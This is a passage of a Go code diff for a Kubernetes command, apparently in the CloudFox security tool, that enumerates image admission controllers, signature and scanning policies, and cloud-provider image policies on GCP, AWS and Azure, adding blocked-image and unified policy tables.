@@ -5,11 +5,21 @@ import (
 	"fmt"
 	"strings"
 
+	"github.com/Azure/azure-sdk-for-go/sdk/azidentity"
+	"github.com/Azure/azure-sdk-for-go/sdk/resourcemanager/policyinsights/armpolicyinsights"
+	"github.com/Azure/azure-sdk-for-go/sdk/resourcemanager/resources/armpolicy"
 	"github.com/BishopFox/cloudfox/globals"
 	"github.com/BishopFox/cloudfox/internal"
 	"github.com/BishopFox/cloudfox/kubernetes/config"
 	"github.com/BishopFox/cloudfox/kubernetes/shared"
+	"github.com/BishopFox/cloudfox/kubernetes/shared/admission"
+	"github.com/aws/aws-sdk-go-v2/aws"
+	awsconfig "github.com/aws/aws-sdk-go-v2/config"
+	"github.com/aws/aws-sdk-go-v2/service/ecr"
+	"github.com/aws/aws-sdk-go-v2/service/signer"
 	"github.com/spf13/cobra"
+	binaryauthorization "google.golang.org/api/binaryauthorization/v1"
+	"google.golang.org/api/option"
 	metav1 "k8s.io/apimachinery/pkg/apis/meta/v1"
 	"k8s.io/apimachinery/pkg/apis/meta/v1/unstructured"
 	"k8s.io/apimachinery/pkg/runtime/schema"
@@ -25,23 +35,77 @@ var ImageAdmissionCmd = &cobra.Command{
 	Short:   "Enumerate image admission controllers and registry policies",
 	Long: `
 Analyze image admission controllers and policies including:
-  - Registry allowlists/denylists
-  - Image signature verification (Cosign, Notary, Sigstore)
-  - Binary authorization and attestations
-  - Vulnerability scanning admission
-  - Policy engine image rules (Kyverno, Gatekeeper, etc.)
 
-Detected controllers:
+Image Signature Verification:
+  - Cosign, Notary, Sigstore policy-controller
   - Portieris (IBM) - Image signature verification
   - Connaisseur - Signature verification
-  - Kritis (Google) - Binary authorization for GKE
   - Ratify (Microsoft) - Artifact verification
   - ImagePolicyWebhook - Built-in Kubernetes
-  - Policy engine image rules
 
-  cloudfox kubernetes image-admission`,
+Policy Engine Image Rules:
+  - Kyverno image verification policies
+  - Gatekeeper/OPA image constraints
+  - Registry allowlists/denylists
+
+In-Cluster Cloud Detection (no flags required):
+  Detects cloud-specific image admission from in-cluster resources:
+  - AWS Signer webhooks, ECR pull-through cache configs
+  - GCP Binary Authorization (Kritis) CRDs
+  - Azure Defender for Containers webhooks
+
+Cloud Provider API Policies (requires --cloud-provider flag):
+  Use --cloud-provider to fetch policies directly from cloud provider APIs.
+  This provides comprehensive policy details not available from in-cluster resources.
+
+  GCP (--cloud-provider gcp):
+    - Binary Authorization project policy (enforcement mode, default rules)
+    - Attestors and their public keys
+    - Cluster-specific admission policies
+    - Exempt images and patterns
+    - Uses GCP credentials with --gcp-project or discovers from cluster
+
+  AWS (--cloud-provider aws):
+    - ECR repository scan configurations
+    - ECR registry scanning settings
+    - AWS Signer signing profiles
+    - ECR lifecycle policies affecting image availability
+    - Uses AWS credentials from --aws-profile or default credential chain
+
+  Azure (--cloud-provider azure):
+    - Azure Policy assignments for AKS image restrictions
+    - Azure Defender for Containers configurations
+    - ACR quarantine policies
+    - Container registry webhooks
+    - Uses Azure credentials with --azure-subscription or discovers from cluster
+
+Registry Analysis:
+  - Registry type detection (ECR, GCR, ACR, Docker Hub, etc.)
+  - Private vs public registry identification
+  - Image pull secret analysis
+
+Examples:
+  # Basic in-cluster analysis
+  cloudfox kubernetes image-admission
+
+  # With detailed image table
+  cloudfox kubernetes image-admission --detailed
+
+  # With GCP Binary Authorization policy from API
+  cloudfox kubernetes image-admission --cloud-provider gcp --gcp-project my-project
+
+  # With AWS ECR policies from API
+  cloudfox kubernetes image-admission --cloud-provider aws --aws-profile myprofile
+
+  # With Azure Policy from API
+  cloudfox kubernetes image-admission --cloud-provider azure --azure-subscription sub-id
+
+  # Multiple cloud providers
+  cloudfox kubernetes image-admission --cloud-provider gcp,aws,azure --detailed`,
 	Run: ListImageAdmission,
 }
+
+// init() removed - detailed flag is now a global persistent flag in cli/kubernetes.go
 
 type ImageAdmissionOutput struct {
 	Table []internal.TableFile
@@ -65,7 +129,6 @@ type ImageAdmissionController struct {
 	BlockedRepos   []string
 	SignatureReqs  bool
 	VulnScanning   bool
-	BypassRisk     string
 	ImageVerified  bool // True if controller image was verified
 }
 
@@ -177,7 +240,6 @@ type RegistryUsage struct {
 	LatestCount    int
 	NoTagCount     int
 	DigestCount    int
-	RiskLevel      string
 }
 
 // ImageInfo represents a deployed container image
@@ -194,6 +256,16 @@ type ImageInfo struct {
 	Namespace   string
 	Container   string
 	IsInit      bool
+}
+
+// ImageEnumeratedPolicy represents a unified policy entry for the policies table
+type ImageEnumeratedPolicy struct {
+	Namespace string
+	Tool      string
+	Name      string
+	Scope     string
+	Type      string
+	Details   string
 }
 
 // PolicyEffectivenessAnalysis analyzes how effective image policies are
@@ -436,6 +508,87 @@ type DockerScoutPolicy struct {
 	SeverityThreshold string
 }
 
+// ImageAdmissionCloudClients holds cloud provider clients for image admission
+type ImageAdmissionCloudClients struct {
+	// GCP
+	GCPBinaryAuthService *binaryauthorization.Service
+	GCPProjects          []string
+
+	// AWS
+	AWSECRClient    *ecr.Client
+	AWSSignerClient *signer.Client
+	AWSRegion       string
+
+	// Azure
+	AzureCredential        *azidentity.DefaultAzureCredential
+	AzurePolicyClient      *armpolicy.AssignmentsClient
+	AzurePolicyStateClient *armpolicyinsights.PolicyStatesClient
+	AzureSubscriptions     []string
+}
+
+// CloudImagePolicy represents an image admission policy from a cloud provider
+type CloudImagePolicy struct {
+	Provider          string   // gcp, aws, azure
+	PolicyType        string   // binary-auth, ecr-scan, signer-profile, azure-policy, etc.
+	Name              string
+	Scope             string   // project, account, subscription, cluster, repository
+	ScopeID           string   // project ID, account ID, subscription ID
+	EnforcementMode   string   // enforce, dryrun, audit, disabled
+	DefaultAction     string   // allow, deny, require-attestation
+	BlocksDeployment  bool     // Does this policy actually block deployment?
+	Details           string   // human-readable details
+	AttestorsCount    int      // number of attestors (GCP)
+	ExemptImages      []string // Bypass patterns (GCP exempt images)
+	AllowedRegistries []string // Allowed registries (Azure)
+	DeniedRegistries  []string // Denied registries (Azure)
+}
+
+// GCPBinaryAuthAttestor represents a GCP Binary Authorization attestor
+type GCPBinaryAuthAttestor struct {
+	Name        string
+	Project     string
+	Description string
+	KeyCount    int
+	KeyAlgorithm string
+	UpdateTime  string
+}
+
+// AWSECRScanConfig represents ECR repository scan configuration
+type AWSECRScanConfig struct {
+	RepositoryName  string
+	RegistryID      string
+	ScanOnPush      bool
+	ScanFrequency   string // SCAN_ON_PUSH, CONTINUOUS_SCAN, MANUAL
+	ImageCount      int
+	LastScanTime    string
+	ScanFindings    string // count of findings by severity
+}
+
+// AWSSignerProfile represents an AWS Signer signing profile
+type AWSSignerProfile struct {
+	ProfileName     string
+	ProfileVersion  string
+	PlatformID      string // Notation-OCI-SHA384-ECDSA
+	Status          string
+	SignatureValid  string
+	Tags            map[string]string
+}
+
+// AzureImagePolicy represents an Azure policy related to container images
+type AzureImagePolicy struct {
+	PolicyName        string
+	DisplayName       string
+	PolicyType        string // BuiltIn, Custom
+	Scope             string
+	AssignmentName    string
+	EnforcementMode   string
+	Effect            string   // Deny, Audit, AuditIfNotExists
+	BlocksDeployment  bool     // Does this policy block deployment?
+	AllowedRegistries []string // Registries that are allowed
+	DeniedRegistries  []string // Registries that are denied
+	Parameters        string
+}
+
 // Common public registries to check
 var publicRegistries = map[string]string{
 	"docker.io":           "Docker Hub",
@@ -461,7 +614,7 @@ var publicRegistries = map[string]string{
 // verifyImageAdmissionImage checks if an image matches known patterns for the specified controller
 // Now uses the shared admission SDK for centralized engine detection
 func verifyImageAdmissionImage(image string, controller string) bool {
-	return VerifyControllerImage(image, controller)
+	return admission.VerifyControllerImage(image, controller)
 }
 
 // ImagePolicyFinding represents a finding for image admission
@@ -475,7 +628,6 @@ type ImagePolicyFinding struct {
 	SignatureReq     string
 	Attestation      string
 	VulnPolicy       string
-	BypassRisk       string
 }
 
 // AllowedImageEntry represents an allowed image/registry entry from policies
@@ -494,6 +646,19 @@ type AllowedImageEntry struct {
 	EnumerateCmd      string   // kubectl command to view the source resource
 }
 
+// BlockedImageEntry represents a blocked/denied image/registry entry from policies
+// This shows what images are explicitly blacklisted and cannot be deployed
+type BlockedImageEntry struct {
+	Controller     string   // Which admission controller blocks this
+	PolicyName     string   // Name of the policy
+	Scope          string   // cluster or namespace
+	Namespaces     []string // If namespace-scoped, which namespaces
+	BlockedPattern string   // Image pattern/registry blocked (e.g., "docker.io/*", "*:latest")
+	Reason         string   // Why it's blocked (e.g., "public registry", "no digest", "blacklisted")
+	Effect         string   // What happens (deny, audit, warn)
+	SourceResource string   // Kubernetes resource where this policy was found
+}
+
 func ListImageAdmission(cmd *cobra.Command, args []string) {
 	ctx, cancel := shared.ContextWithCancel()
 	defer cancel()
@@ -504,6 +669,7 @@ func ListImageAdmission(cmd *cobra.Command, args []string) {
 	wrap, _ := parentCmd.PersistentFlags().GetBool("wrap")
 	outputDirectory, _ := parentCmd.PersistentFlags().GetString("outdir")
 	format, _ := parentCmd.PersistentFlags().GetString("output")
+	detailed := globals.K8sDetailed
 
 	logger.InfoM(fmt.Sprintf("Analyzing image admission controllers for %s", globals.ClusterName), K8S_IMAGE_ADMISSION_MODULE_NAME)
 
@@ -678,6 +844,22 @@ func ListImageAdmission(cmd *cobra.Command, args []string) {
 	// Check for policy engine image rules (Kyverno, Gatekeeper)
 	policyEngineFindings := analyzeImagePolicyEngines(ctx, dynClient)
 
+	// Check for Conftest image policies
+	logger.InfoM("Analyzing Conftest image policies...", K8S_IMAGE_ADMISSION_MODULE_NAME)
+	conftestController, conftestPolicies := analyzeConftestImagePolicies(ctx, clientset, dynClient)
+	if conftestController.Name != "" {
+		controllers = append(controllers, conftestController)
+		logger.InfoM(fmt.Sprintf("Found %d Conftest image policies", len(conftestPolicies)), K8S_IMAGE_ADMISSION_MODULE_NAME)
+	}
+
+	// Check for Datree image policies
+	logger.InfoM("Analyzing Datree image policies...", K8S_IMAGE_ADMISSION_MODULE_NAME)
+	datreeController, datreePolicies := analyzeDatreeImagePolicies(ctx, clientset, dynClient)
+	if datreeController.Name != "" {
+		controllers = append(controllers, datreeController)
+		logger.InfoM(fmt.Sprintf("Found %d Datree image policies", len(datreePolicies)), K8S_IMAGE_ADMISSION_MODULE_NAME)
+	}
+
 	// Note: All policy variables are now used in extractAllowedImages function
 
 	// Get target namespaces for image source analysis
@@ -697,6 +879,42 @@ func ListImageAdmission(cmd *cobra.Command, args []string) {
 
 	// Analyze deployed images
 	imageSourceAnalysis := analyzeImageSources(ctx, clientset, namespaces)
+
+	// Analyze cloud provider image policies (if --cloud-provider flag specified)
+	logger.InfoM("Analyzing cloud provider image policies...", K8S_IMAGE_ADMISSION_MODULE_NAME)
+	cloudClients := initImageAdmissionCloudClients(logger)
+	var cloudPolicies []CloudImagePolicy
+	var gcpAttestors []GCPBinaryAuthAttestor
+	var awsScanConfigs []AWSECRScanConfig
+	var awsSignerProfiles []AWSSignerProfile
+	var azureImagePolicies []AzureImagePolicy
+
+	if cloudClients != nil {
+		// GCP Binary Authorization
+		if cloudClients.GCPBinaryAuthService != nil {
+			logger.InfoM("Fetching GCP Binary Authorization policies...", K8S_IMAGE_ADMISSION_MODULE_NAME)
+			gcpPolicies, attestors := analyzeGCPBinaryAuth(ctx, cloudClients, logger)
+			cloudPolicies = append(cloudPolicies, gcpPolicies...)
+			gcpAttestors = attestors
+		}
+
+		// AWS ECR and Signer
+		if cloudClients.AWSECRClient != nil {
+			logger.InfoM("Fetching AWS ECR/Signer policies...", K8S_IMAGE_ADMISSION_MODULE_NAME)
+			awsPolicies, scanCfgs, signerProfs := analyzeAWSImagePolicies(ctx, cloudClients, logger)
+			cloudPolicies = append(cloudPolicies, awsPolicies...)
+			awsScanConfigs = scanCfgs
+			awsSignerProfiles = signerProfs
+		}
+
+		// Azure Policy
+		if cloudClients.AzureCredential != nil {
+			logger.InfoM("Fetching Azure Policy assignments...", K8S_IMAGE_ADMISSION_MODULE_NAME)
+			azPolicies, azImgPolicies := analyzeAzureImagePolicies(ctx, cloudClients, logger)
+			cloudPolicies = append(cloudPolicies, azPolicies...)
+			azureImagePolicies = azImgPolicies
+		}
+	}
 
 	// Build findings
 	var findings []ImagePolicyFinding
@@ -759,10 +977,6 @@ func ListImageAdmission(cmd *cobra.Command, args []string) {
 
 	// Add Kritis findings
 	for _, policy := range kritisPolicies {
-		bypassRisk := ""
-		if policy.DefaultAllow {
-			bypassRisk = "Default Allow"
-		}
 		findings = append(findings, ImagePolicyFinding{
 			Controller:   "Kritis",
 			PolicyName:   policy.Name,
@@ -770,7 +984,6 @@ func ListImageAdmission(cmd *cobra.Command, args []string) {
 			Namespace:    policy.Namespace,
 			SignatureReq: "Yes",
 			Attestation:  strings.Join(policy.RequiredAttestors, ", "),
-			BypassRisk:   bypassRisk,
 		})
 	}
 
@@ -779,10 +992,6 @@ func ListImageAdmission(cmd *cobra.Command, args []string) {
 		mode := policy.Mode
 		if mode == "" {
 			mode = "enforce"
-		}
-		bypassRisk := ""
-		if mode == "warn" {
-			bypassRisk = "Warn only"
 		}
 		for _, image := range policy.Images {
 			findings = append(findings, ImagePolicyFinding{
@@ -793,7 +1002,6 @@ func ListImageAdmission(cmd *cobra.Command, args []string) {
 				Policy:       mode,
 				SignatureReq: "Yes",
 				Attestation:  strings.Join(policy.Authorities, ", "),
-				BypassRisk:   bypassRisk,
 			})
 		}
 	}
@@ -837,6 +1045,541 @@ func ListImageAdmission(cmd *cobra.Command, args []string) {
 		policyEngineFindings,
 	)
 
+	// Extract blocked images from all policies
+	blockedImages := extractBlockedImages(
+		controllers,
+		portierisPolicies,
+		connaisseurPolicies,
+		sigstorePolicies,
+		kritisPolicies,
+		aquaPolicies,
+		prismaPolicies,
+		sysdigPolicies,
+		neuvectorPolicies,
+		anchorePolicies,
+		stackroxPolicies,
+		snykPolicies,
+		trivyPolicies,
+		policyEngineFindings,
+	)
+
+	// Build unified policies table
+	var unifiedPolicies []ImageEnumeratedPolicy
+
+	// Add Portieris policies
+	for _, policy := range portierisPolicies {
+		scope := "Namespace"
+		if policy.IsClusterPolicy {
+			scope = "Cluster"
+		}
+		for _, repo := range policy.Repositories {
+			details := fmt.Sprintf("Repository: %s, Policy: %s", repo.Name, repo.Policy)
+			if repo.VulnPolicy != "" {
+				details += fmt.Sprintf(", Vuln: %s", repo.VulnPolicy)
+			}
+			unifiedPolicies = append(unifiedPolicies, ImageEnumeratedPolicy{
+				Namespace: policy.Namespace,
+				Tool:      "Portieris",
+				Name:      policy.Name,
+				Scope:     scope,
+				Type:      "Image Signature",
+				Details:   details,
+			})
+		}
+	}
+
+	// Add Connaisseur policies
+	for _, policy := range connaisseurPolicies {
+		details := fmt.Sprintf("Pattern: %s, Rule: %s", policy.Pattern, policy.Rule)
+		if len(policy.Validators) > 0 {
+			details += fmt.Sprintf(", Validators: %s", strings.Join(policy.Validators, ", "))
+		}
+		unifiedPolicies = append(unifiedPolicies, ImageEnumeratedPolicy{
+			Namespace: "<ALL>",
+			Tool:      "Connaisseur",
+			Name:      policy.Name,
+			Scope:     "Cluster",
+			Type:      "Image Signature",
+			Details:   details,
+		})
+	}
+
+	// Add Ratify policies
+	for _, policy := range ratifyPolicies {
+		scope := "Cluster"
+		ns := "<ALL>"
+		if policy.Namespace != "" {
+			scope = "Namespace"
+			ns = policy.Namespace
+		}
+		details := fmt.Sprintf("Verifiers: %s", strings.Join(policy.Verifiers, ", "))
+		if len(policy.ArtifactTypes) > 0 {
+			details += fmt.Sprintf(", Artifacts: %s", strings.Join(policy.ArtifactTypes, ", "))
+		}
+		unifiedPolicies = append(unifiedPolicies, ImageEnumeratedPolicy{
+			Namespace: ns,
+			Tool:      "Ratify",
+			Name:      policy.Name,
+			Scope:     scope,
+			Type:      "Artifact Verification",
+			Details:   details,
+		})
+	}
+
+	// Add Kritis policies
+	for _, policy := range kritisPolicies {
+		details := fmt.Sprintf("Attestors: %s", strings.Join(policy.RequiredAttestors, ", "))
+		if policy.DefaultAllow {
+			details += ", Default: Allow"
+		}
+		unifiedPolicies = append(unifiedPolicies, ImageEnumeratedPolicy{
+			Namespace: policy.Namespace,
+			Tool:      "Kritis",
+			Name:      policy.Name,
+			Scope:     "Namespace",
+			Type:      "Binary Authorization",
+			Details:   details,
+		})
+	}
+
+	// Add Sigstore policies
+	for _, policy := range sigstorePolicies {
+		mode := policy.Mode
+		if mode == "" {
+			mode = "enforce"
+		}
+		details := fmt.Sprintf("Mode: %s, Images: %s", mode, strings.Join(policy.Images, ", "))
+		if len(policy.Authorities) > 0 {
+			details += fmt.Sprintf(", Authorities: %s", strings.Join(policy.Authorities, ", "))
+		}
+		unifiedPolicies = append(unifiedPolicies, ImageEnumeratedPolicy{
+			Namespace: "<ALL>",
+			Tool:      "Sigstore",
+			Name:      policy.Name,
+			Scope:     "Cluster",
+			Type:      "Image Signature",
+			Details:   details,
+		})
+	}
+
+	// Add individual policies from each security tool
+	// Aqua Security policies
+	for _, p := range aquaPolicies {
+		details := fmt.Sprintf("CVSS: %.1f", p.CVSSThreshold)
+		if p.BlockUnregistered {
+			details += ", Block Unregistered"
+		}
+		if p.BlockMalware {
+			details += ", Block Malware"
+		}
+		if len(p.AllowedRegistries) > 0 {
+			details += fmt.Sprintf(", Registries: %d", len(p.AllowedRegistries))
+		}
+		unifiedPolicies = append(unifiedPolicies, ImageEnumeratedPolicy{
+			Namespace: p.Namespace,
+			Tool:      "Aqua",
+			Name:      p.Name,
+			Scope:     "Namespace",
+			Type:      "Admission Policy",
+			Details:   details,
+		})
+	}
+
+	// Prisma Cloud policies
+	for _, p := range prismaPolicies {
+		details := fmt.Sprintf("Block: %s", p.BlockThreshold)
+		if p.GracePeriodDays > 0 {
+			details += fmt.Sprintf(", Grace: %dd", p.GracePeriodDays)
+		}
+		if p.BlockMalware {
+			details += ", Block Malware"
+		}
+		unifiedPolicies = append(unifiedPolicies, ImageEnumeratedPolicy{
+			Namespace: "<ALL>",
+			Tool:      "Prisma",
+			Name:      p.Name,
+			Scope:     "Cluster",
+			Type:      "Image Scanning",
+			Details:   details,
+		})
+	}
+
+	// Sysdig Secure policies
+	for _, p := range sysdigPolicies {
+		details := fmt.Sprintf("CVSS: %.1f", p.CVSSThreshold)
+		if p.BlockOnFailure {
+			details += ", Block on Failure"
+		}
+		if len(p.AllowedRegistries) > 0 {
+			details += fmt.Sprintf(", Registries: %d", len(p.AllowedRegistries))
+		}
+		unifiedPolicies = append(unifiedPolicies, ImageEnumeratedPolicy{
+			Namespace: "<ALL>",
+			Tool:      "Sysdig",
+			Name:      p.Name,
+			Scope:     "Cluster",
+			Type:      "Admission Policy",
+			Details:   details,
+		})
+	}
+
+	// NeuVector policies
+	for _, p := range neuvectorPolicies {
+		details := fmt.Sprintf("Mode: %s", p.Mode)
+		if p.BlockHighCVE {
+			details += ", Block High CVE"
+		}
+		if len(p.DeniedRegistries) > 0 {
+			details += fmt.Sprintf(", Denied: %d registries", len(p.DeniedRegistries))
+		}
+		unifiedPolicies = append(unifiedPolicies, ImageEnumeratedPolicy{
+			Namespace: p.Namespace,
+			Tool:      "NeuVector",
+			Name:      p.Name,
+			Scope:     "Namespace",
+			Type:      "Admission Policy",
+			Details:   details,
+		})
+	}
+
+	// StackRox policies
+	for _, p := range stackroxPolicies {
+		details := fmt.Sprintf("Severity: %s, Action: %s", p.Severity, p.EnforcementAction)
+		if len(p.Categories) > 0 {
+			details += fmt.Sprintf(", Categories: %s", strings.Join(p.Categories, ","))
+		}
+		unifiedPolicies = append(unifiedPolicies, ImageEnumeratedPolicy{
+			Namespace: "<ALL>",
+			Tool:      "StackRox",
+			Name:      p.Name,
+			Scope:     "Cluster",
+			Type:      "Security Policy",
+			Details:   details,
+		})
+	}
+
+	// Snyk Container policies
+	for _, p := range snykPolicies {
+		details := fmt.Sprintf("Severity: %s", p.SeverityThreshold)
+		if p.BlockOnFailure {
+			details += ", Block on Failure"
+		}
+		if p.AutoFix {
+			details += ", AutoFix"
+		}
+		unifiedPolicies = append(unifiedPolicies, ImageEnumeratedPolicy{
+			Namespace: "<ALL>",
+			Tool:      "Snyk",
+			Name:      p.Name,
+			Scope:     "Cluster",
+			Type:      "Container Policy",
+			Details:   details,
+		})
+	}
+
+	// Anchore policies
+	for _, p := range anchorePolicies {
+		details := fmt.Sprintf("Mode: %s", p.Mode)
+		if p.PolicyBundleID != "" {
+			details += fmt.Sprintf(", Bundle: %s", p.PolicyBundleID)
+		}
+		if p.FailOnPolicyEval {
+			details += ", Fail on Eval"
+		}
+		unifiedPolicies = append(unifiedPolicies, ImageEnumeratedPolicy{
+			Namespace: "<ALL>",
+			Tool:      "Anchore",
+			Name:      p.Name,
+			Scope:     "Cluster",
+			Type:      "Policy Bundle",
+			Details:   details,
+		})
+	}
+
+	// Trivy Operator policies
+	for _, p := range trivyPolicies {
+		details := fmt.Sprintf("Severity: %s", p.SeverityThreshold)
+		if p.VulnerabilityReports {
+			details += ", Vuln Reports"
+		}
+		if p.ConfigAuditReports {
+			details += ", Config Audit"
+		}
+		if p.SBOMEnabled {
+			details += ", SBOM"
+		}
+		unifiedPolicies = append(unifiedPolicies, ImageEnumeratedPolicy{
+			Namespace: p.Namespace,
+			Tool:      "Trivy",
+			Name:      p.Name,
+			Scope:     "Namespace",
+			Type:      "Operator Config",
+			Details:   details,
+		})
+	}
+
+	// Kubewarden policies
+	for _, p := range kubewardenPolicies {
+		scope := "Namespace"
+		ns := p.Namespace
+		if p.IsClusterWide {
+			scope = "Cluster"
+			ns = "<ALL>"
+		}
+		details := fmt.Sprintf("Mode: %s, Server: %s", p.Mode, p.PolicyServer)
+		if p.Mutating {
+			details += ", Mutating"
+		}
+		unifiedPolicies = append(unifiedPolicies, ImageEnumeratedPolicy{
+			Namespace: ns,
+			Tool:      "Kubewarden",
+			Name:      p.Name,
+			Scope:     scope,
+			Type:      "Admission Policy",
+			Details:   details,
+		})
+	}
+
+	// Notation policies
+	for _, p := range notationPolicies {
+		details := fmt.Sprintf("Verification: %s", p.VerificationLevel)
+		if len(p.TrustStores) > 0 {
+			details += fmt.Sprintf(", Stores: %d", len(p.TrustStores))
+		}
+		if p.SignatureFormat != "" {
+			details += fmt.Sprintf(", Format: %s", p.SignatureFormat)
+		}
+		unifiedPolicies = append(unifiedPolicies, ImageEnumeratedPolicy{
+			Namespace: "<ALL>",
+			Tool:      "Notation",
+			Name:      p.Name,
+			Scope:     "Cluster",
+			Type:      "Signature Verification",
+			Details:   details,
+		})
+	}
+
+	// Harbor policies
+	for _, p := range harborPolicies {
+		details := fmt.Sprintf("Severity: %s", p.SeverityThreshold)
+		if p.PreventVulnImages {
+			details += ", Block Vuln Images"
+		}
+		if p.ContentTrustEnabled {
+			details += ", Content Trust"
+		}
+		if p.CosignEnabled {
+			details += ", Cosign"
+		}
+		unifiedPolicies = append(unifiedPolicies, ImageEnumeratedPolicy{
+			Namespace: "<ALL>",
+			Tool:      "Harbor",
+			Name:      p.Name,
+			Scope:     "Project",
+			Type:      "Registry Policy",
+			Details:   details,
+		})
+	}
+
+	// AWS Signer policies
+	for _, p := range awsSignerPolicies {
+		details := fmt.Sprintf("Platform: %s", p.PlatformID)
+		if p.SigningProfileARN != "" {
+			details += ", Has Profile"
+		}
+		if p.AllowUnsigned {
+			details += ", Allow Unsigned"
+		}
+		unifiedPolicies = append(unifiedPolicies, ImageEnumeratedPolicy{
+			Namespace: "<ALL>",
+			Tool:      "AWSSigner",
+			Name:      p.Name,
+			Scope:     "Cluster",
+			Type:      "Code Signing",
+			Details:   details,
+		})
+	}
+
+	// Clair policies
+	for _, p := range clairPolicies {
+		details := fmt.Sprintf("Severity: %s", p.SeverityThreshold)
+		if p.FixableOnly {
+			details += ", Fixable Only"
+		}
+		if len(p.AllowList) > 0 {
+			details += fmt.Sprintf(", Allow List: %d", len(p.AllowList))
+		}
+		unifiedPolicies = append(unifiedPolicies, ImageEnumeratedPolicy{
+			Namespace: "<ALL>",
+			Tool:      "Clair",
+			Name:      p.Name,
+			Scope:     "Cluster",
+			Type:      "Vulnerability Scanning",
+			Details:   details,
+		})
+	}
+
+	// Wiz policies
+	for _, p := range wizPolicies {
+		details := fmt.Sprintf("Severity: %s", p.SeverityThreshold)
+		if p.BlockVulnerabilities {
+			details += ", Block Vulnerabilities"
+		}
+		if len(p.AllowedRegistries) > 0 {
+			details += fmt.Sprintf(", Registries: %d", len(p.AllowedRegistries))
+		}
+		unifiedPolicies = append(unifiedPolicies, ImageEnumeratedPolicy{
+			Namespace: "<ALL>",
+			Tool:      "Wiz",
+			Name:      p.Name,
+			Scope:     "Cluster",
+			Type:      "Cloud Security",
+			Details:   details,
+		})
+	}
+
+	// Lacework policies
+	for _, p := range laceworkPolicies {
+		details := fmt.Sprintf("Severity: %s", p.SeverityThreshold)
+		if p.BlockOnFailure {
+			details += ", Block on Failure"
+		}
+		if p.IntegrationID != "" {
+			details += ", Integrated"
+		}
+		unifiedPolicies = append(unifiedPolicies, ImageEnumeratedPolicy{
+			Namespace: "<ALL>",
+			Tool:      "Lacework",
+			Name:      p.Name,
+			Scope:     "Cluster",
+			Type:      "Cloud Security",
+			Details:   details,
+		})
+	}
+
+	// Cosign policies
+	for _, p := range cosignPolicies {
+		details := fmt.Sprintf("Keys: %d", len(p.KeyRefs))
+		if p.KeylessEnabled {
+			details += ", Keyless"
+		}
+		if p.VerifyAttestations {
+			details += ", Attestations"
+		}
+		if p.TransparencyLog {
+			details += ", Rekor"
+		}
+		unifiedPolicies = append(unifiedPolicies, ImageEnumeratedPolicy{
+			Namespace: "<ALL>",
+			Tool:      "Cosign",
+			Name:      p.Name,
+			Scope:     "Cluster",
+			Type:      "Signature Policy",
+			Details:   details,
+		})
+	}
+
+	// Flux Image policies
+	for _, p := range fluxImagePolicies {
+		details := fmt.Sprintf("Policy: %s", p.Policy)
+		if p.FilterTags != "" {
+			details += fmt.Sprintf(", Filter: %s", p.FilterTags)
+		}
+		if p.Range != "" {
+			details += fmt.Sprintf(", Range: %s", p.Range)
+		}
+		unifiedPolicies = append(unifiedPolicies, ImageEnumeratedPolicy{
+			Namespace: p.Namespace,
+			Tool:      "Flux",
+			Name:      p.Name,
+			Scope:     "Namespace",
+			Type:      "Image Automation",
+			Details:   details,
+		})
+	}
+
+	// JFrog Xray policies
+	for _, p := range xrayPolicies {
+		details := fmt.Sprintf("Severity: %s", p.SeverityThreshold)
+		if len(p.PolicyRules) > 0 {
+			details += fmt.Sprintf(", Rules: %d", len(p.PolicyRules))
+		}
+		if p.BlockDownloads {
+			details += ", Block Downloads"
+		}
+		unifiedPolicies = append(unifiedPolicies, ImageEnumeratedPolicy{
+			Namespace: "<ALL>",
+			Tool:      "JFrogXray",
+			Name:      p.Name,
+			Scope:     "Cluster",
+			Type:      "Security Policy",
+			Details:   details,
+		})
+	}
+
+	// Deepfence policies
+	for _, p := range deepfencePolicies {
+		details := fmt.Sprintf("Severity: %s", p.SeverityThreshold)
+		if p.BlockMalware {
+			details += ", Block Malware"
+		}
+		unifiedPolicies = append(unifiedPolicies, ImageEnumeratedPolicy{
+			Namespace: "<ALL>",
+			Tool:      "Deepfence",
+			Name:      p.Name,
+			Scope:     "Cluster",
+			Type:      "Threat Mapper",
+			Details:   details,
+		})
+	}
+
+	// Qualys policies
+	for _, p := range qualysPolicies {
+		details := fmt.Sprintf("Severity: %s", p.SeverityThreshold)
+		if p.BlockOnCritical {
+			details += ", Block Critical"
+		}
+		unifiedPolicies = append(unifiedPolicies, ImageEnumeratedPolicy{
+			Namespace: "<ALL>",
+			Tool:      "Qualys",
+			Name:      p.Name,
+			Scope:     "Cluster",
+			Type:      "Container Security",
+			Details:   details,
+		})
+	}
+
+	// Docker Scout policies
+	for _, p := range dockerScoutPolicies {
+		details := fmt.Sprintf("Severity: %s", p.SeverityThreshold)
+		if p.PolicyCheck {
+			details += ", Policy Check"
+		}
+		if p.SBOMEnabled {
+			details += ", SBOM"
+		}
+		unifiedPolicies = append(unifiedPolicies, ImageEnumeratedPolicy{
+			Namespace: "<ALL>",
+			Tool:      "DockerScout",
+			Name:      p.Name,
+			Scope:     "Cluster",
+			Type:      "Image Analysis",
+			Details:   details,
+		})
+	}
+
+	// Add Azure Policy
+	for _, config := range azurePolicyConfigs {
+		unifiedPolicies = append(unifiedPolicies, ImageEnumeratedPolicy{
+			Namespace: "<ALL>",
+			Tool:      "AzurePolicy",
+			Name:      config.Name,
+			Scope:     "Cluster",
+			Type:      "Policy Enforcement",
+			Details:   "Azure Policy for AKS",
+		})
+	}
+
 	// Generate tables
 	controllerHeaders := []string{
 		"Controller",
@@ -847,39 +1590,33 @@ func ListImageAdmission(cmd *cobra.Command, args []string) {
 		"Status",
 		"Policies",
 		"Signature Required",
-		"Bypass Risk",
+		"Issues",
 	}
 
 	findingHeaders := []string{
+		"Namespace",
 		"Controller",
 		"Policy",
 		"Scope",
-		"Namespace",
 		"Repository/Pattern",
 		"Action",
 		"Signature",
 		"Attestation",
 		"Vuln Policy",
-		"Bypass Risk",
+		"Issues",
 	}
 
-	registryHeaders := []string{
-		"Risk",
+	imagesHeaders := []string{
+		"Namespace",
+		"Pod",
+		"Container",
 		"Registry",
-		"Type",
-		"Image Count",
-		"Unique Images",
-		"Namespaces",
-		":latest Count",
-		"Digest Pinned",
-		"Policy Coverage",
-		"Blocking Policy",
-	}
-
-	summaryHeaders := []string{
-		"Metric",
-		"Value",
-		"Risk Assessment",
+		"Repository",
+		"Tag",
+		"Digest",
+		"Public Registry",
+		":latest",
+		"Issues",
 	}
 
 	allowedImagesHeaders := []string{
@@ -890,26 +1627,332 @@ func ListImageAdmission(cmd *cobra.Command, args []string) {
 		"Allowed Pattern",
 		"Signature Req",
 		"Conditions",
-		"Deploy Command",
